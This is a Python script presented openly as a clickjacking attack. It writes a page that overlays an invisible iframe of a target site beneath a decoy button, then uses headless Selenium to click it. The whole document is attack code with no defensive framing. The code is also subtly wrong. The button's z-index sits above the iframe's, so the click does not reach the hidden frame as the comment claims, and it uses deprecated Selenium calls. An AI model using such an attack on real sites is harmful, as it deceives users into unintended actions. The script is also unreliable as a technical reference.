from selenium import webdriver
from selenium.webdriver.chrome.options import Options

# Configure Selenium WebDriver
chrome_options = Options()
chrome_options.add_argument("--headless")  # Run in headless mode
chrome_driver_path = '/path/to/chromedriver'  # Update with your chromedriver path

# URL of the target to be clickjacked
TARGET_URL = 'http://vulnerable-website.com/important-action'

def setup_attack_page():
    # Generate an HTML page with a clickjacking frame
    attack_page_content = '''
    <html>
        <body>
            <iframe src="{target_url}" style="opacity: 0.0; position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10;"></iframe>
            <button style="position: relative; z-index: 20;">Click me!</button>
        </body>
    </html>
    '''.format(target_url=TARGET_URL)
    
    with open('attack_page.html', 'w') as file:
        file.write(attack_page_content)

def perform_clickjacking_attack():
    # Setup the attack page
    setup_attack_page()
    
    # Open the attack page using Selenium WebDriver
    driver = webdriver.Chrome(executable_path=chrome_driver_path, options=chrome_options)
    driver.get('file:///path/to/attack_page.html')  # Update with the path to attack_page.html
    
    # Simulate user clicking the button which actually clicks the hidden iframe
    driver.find_element_by_tag_name('button').click()
    
    print("Clickjacking attack performed.")
    driver.quit()

perform_clickjacking_attack()
